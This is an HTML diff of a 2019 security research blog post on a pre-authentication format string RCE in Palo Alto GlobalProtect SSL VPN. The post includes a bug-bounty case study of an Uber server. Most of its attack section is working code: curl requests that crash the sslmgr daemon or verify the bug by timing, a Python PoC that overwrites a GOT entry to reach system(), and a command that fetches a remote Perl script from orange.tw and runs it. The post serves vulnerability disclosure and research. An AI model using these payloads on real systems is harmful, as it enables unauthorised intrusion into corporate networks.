@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Author: Orange Tsai(@orange_8361) and Meh Chang(@mehqq_) SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They’re exposed to the Internet, tru">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!">
+<meta property="og:url" content="http://blog.orange.tw/posts/2019-07-attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="Author: Orange Tsai(@orange_8361) and Meh Chang(@mehqq_) SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They’re exposed to the Internet, tru">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-07-attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto/cd0aa4394622462a-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-07-attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto/8d37282ded80e093-02.png">
+<meta property="article:published_time" content="2019-07-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T08:14:23.364Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2019-07-attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto/cd0aa4394622462a-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study! | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-16T16:00:00.000Z" class="dt-published" itemprop="datePublished">2019-07-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/posts/2019-07-attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto/cd0aa4394622462a-01.png" alt="preview"></p>
+<p><em>Author: Orange Tsai(<a target="_blank" rel="noopener" href="https://twitter.com/orange_8361">@orange_8361</a>) and Meh Chang(<a target="_blank" rel="noopener" href="https://twitter.com/mehqq_">@mehqq_</a>)</em></p>
+<p>SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They’re exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.  </p>
+<p>We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our <a target="_blank" rel="noopener" href="https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545">Black Hat USA</a> and <a target="_blank" rel="noopener" href="https://www.defcon.org/html/defcon-27/dc-27-speakers.html">DEFCON</a> talk:  </p>
+<ul>
+<li><strong>Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs</strong>!</li>
+</ul>
+<p>Don’t worry about the spoilers, this story is not included in our BHUSA&#x2F;DEFCON talks.  </p>
+<p>In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)  </p>
+<h1 id="The-story"><a href="#The-story" class="headerlink" title="The story"></a>The story</h1><p>In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to <code>/global-protect/login.esp</code> on web root!  </p>
+<p>About the vulnerability, we accidentally discovered it during our <a target="_blank" rel="noopener" href="https://devco.re/en/services/red-team">Red Team assessment services</a>. At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.  </p>
+<p>We searched all over the Internet, but we could not find anything. There is no public RCE exploit before<sup>[1]</sup>, no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!  </p>
+<p><em>[1] There are some exploit about the Pan-OS management interface before such as the <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43342">CVE-2017-15944</a> and the excellent <a target="_blank" rel="noopener" href="https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/">Troppers16 paper</a> by <a target="_blank" rel="noopener" href="https://twitter.com/_fel1x">@_fel1x</a>, but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port</em>  </p>
+<h1 id="The-bug"><a href="#The-bug" class="headerlink" title="The bug"></a>The bug</h1><p>The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The <code>sslmgr</code> is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path <code>/sslmgr</code>.  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://global-protect/sslmgr</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">clientcert-response</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">status</span>&gt;</span>error<span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">msg</span>&gt;</span>Invalid parameters<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">clientcert-response</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>During the parameter extraction, the daemon searches the string <code>scep-profile-name</code> and pass its value as the <code>snprintf</code> format to fill in the buffer. That leads to the format string attack. You can just crash the service with <code>%n</code>!  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sslmgr</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>global-protect</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line"><span class="language-cos">scep-profile-name=<span class="built_in">%n</span><span class="built_in">%n</span><span class="built_in">%n</span><span class="built_in">%n</span><span class="built_in">%n</span>...</span></span><br><span class="line"><span class="language-cos"></span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Affect-versions"><a href="#Affect-versions" class="headerlink" title="Affect versions"></a>Affect versions</h1><p>According to our survey, all the GlobalProtect before <code>July 2018</code> are vulnerable! Here is the affect version list:  </p>
+<ul>
+<li>Palo Alto GlobalProtect SSL VPN 7.1.x &lt; 7.1.19</li>
+<li>Palo Alto GlobalProtect SSL VPN 8.0.x &lt; 8.0.12</li>
+<li>Palo Alto GlobalProtect SSL VPN 8.1.x &lt; 8.1.3</li>
+</ul>
+<p>The series 9.x and 7.0.x are not affected by this vulnerability.  </p>
+<h1 id="How-to-verify-the-bug"><a href="#How-to-verify-the-bug" class="headerlink" title="How to verify the bug"></a>How to verify the bug</h1><p>Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we can’t obtain any address-leak to verify the bug. And to crash the service is never our first choice<sup>[1]</sup>. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!  </p>
+<p>By reading the <a target="_blank" rel="noopener" href="https://linux.die.net/man/3/snprintf">snprintf manual</a>, we choose the <code>%c</code> as our gadget! When there is a number before the format, such as <code>%9999999c</code>, the <code>snprintf</code> repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time curl -s -d <span class="string">&#x27;scep-profile-name=%9999999c&#x27;</span> https://global-protect/sslmgr &gt;/dev/null</span></span><br><span class="line">real    0m1.721s</span><br><span class="line">user    0m0.037s</span><br><span class="line">sys     0m0.005s</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time curl -s -d <span class="string">&#x27;scep-profile-name=%99999999c&#x27;</span> https://global-protect/sslmgr &gt;/dev/null</span></span><br><span class="line">real    0m2.051s</span><br><span class="line">user    0m0.035s</span><br><span class="line">sys     0m0.012s</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time curl -s -d <span class="string">&#x27;scep-profile-name=%999999999c&#x27;</span> https://global-protect/sslmgr &gt;/dev/null</span></span><br><span class="line">real    0m5.324s</span><br><span class="line">user    0m0.021s</span><br><span class="line">sys     0m0.018s</span><br></pre></td></tr></table></figure>
+
+<p>As you can see, the response time increases along with the number of <code>%c</code>. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!  </p>
+<p><em>[1] Although there is a watchdog monitoring the <code>sslmgr</code> daemon, it’s still improper to crash a service!</em>  </p>
+<h1 id="The-exploitation"><a href="#The-exploitation" class="headerlink" title="The exploitation"></a>The exploitation</h1><p>Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the <code>/global-protect/portal/css/login.css</code> from 8.x version and the <code>/images/logo_pan_158.gif</code> from 7.x version!  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified</span></span><br><span class="line">Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT</span><br></pre></td></tr></table></figure>
+
+<p>With a specified version, we can write our own exploit now. We simply modified the pointer of <code>strlen</code> on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of <code>system</code>. Here is the PoC:  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://sslvpn/sslmgr&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;echo pwned &gt; /var/appweb/sslvpndocs/hacked.txt&quot;</span></span><br><span class="line"></span><br><span class="line">strlen_GOT = <span class="number">0x667788</span> <span class="comment"># change me</span></span><br><span class="line">system_plt = <span class="number">0x445566</span> <span class="comment"># change me</span></span><br><span class="line"></span><br><span class="line">fmt =  <span class="string">&#x27;%70$n&#x27;</span></span><br><span class="line">fmt += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((system_plt&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>) + <span class="string">&#x27;c&#x27;</span></span><br><span class="line">fmt += <span class="string">&#x27;%32$hn&#x27;</span></span><br><span class="line">fmt += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((system_plt&amp;<span class="number">0xffff</span>)-((system_plt&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)) + <span class="string">&#x27;c&#x27;</span></span><br><span class="line">fmt += <span class="string">&#x27;%24$hn&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">60</span>):</span><br><span class="line">    fmt += <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;scep-profile-name=&quot;</span></span><br><span class="line">data += p32(strlen_GOT)[:-<span class="number">1</span>]</span><br><span class="line">data += <span class="string">&quot;&amp;appauthcookie=&quot;</span></span><br><span class="line">data += p32(strlen_GOT+<span class="number">2</span>)[:-<span class="number">1</span>]</span><br><span class="line">data += <span class="string">&quot;&amp;host-id=&quot;</span></span><br><span class="line">data += p32(strlen_GOT+<span class="number">4</span>)[:-<span class="number">1</span>]</span><br><span class="line">data += <span class="string">&quot;&amp;user-email=&quot;</span></span><br><span class="line">data += fmt</span><br><span class="line">data += <span class="string">&quot;&amp;appauthcookie=&quot;</span></span><br><span class="line">data += cmd</span><br><span class="line">r = requests.post(url, data=data)</span><br></pre></td></tr></table></figure>
+
+<p>Once the modification is done, the <code>sslmgr</code> becomes our webshell and we can execute commands via:  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">&#x27;scep-profile-name=curl orange.tw/bc.pl | perl -&#x27;</span> https://global-protect/sslmgr</span></span><br></pre></td></tr></table></figure>
+
+<p>We have reported this bug to Palo Alto via the <a target="_blank" rel="noopener" href="https://securityadvisories.paloaltonetworks.com/Report">report form</a>. However, we got the following reply:  </p>
+<blockquote>
+<p>Hello Orange,  </p>
+<br>
+
+<p>Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.  </p>
+<br>
+
+<p>Kind regards</p>
+</blockquote>
+<p>Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!  </p>
+<h1 id="The-case-study"><a href="#The-case-study" class="headerlink" title="The case study"></a>The case study</h1><p>After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take <code>vpn.awscorp.uberinternal.com</code> as an example!  </p>
+<p>From the domain name, we guess Uber uses the BYOL from <a target="_blank" rel="noopener" href="https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&sr=0-1&ref_=srh_res_product_title">AWS Marketplace</a>. From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:  </p>
+<ul>
+<li>8.0.3</li>
+<li>8.0.6</li>
+<li>8.0.8</li>
+<li>8.0.9</li>
+<li>8.1.0</li>
+</ul>
+<p>Finally, we figured out the version, it’s 8.0.6 and we got the shell back!  </p>
+<p><img src="/posts/2019-07-attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto/8d37282ded80e093-02.png"></p>
+<p>Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:  </p>
+<blockquote>
+<p>Hey @orange — we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.  </p>
+  <br>
+
+<p>Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!</p>
+</blockquote>
+<p>It’s a fair decision. It’s always a great time communicating with Uber and report to their <a target="_blank" rel="noopener" href="https://hackerone.com/uber">bug bounty program</a>. We don’t care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!  </p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
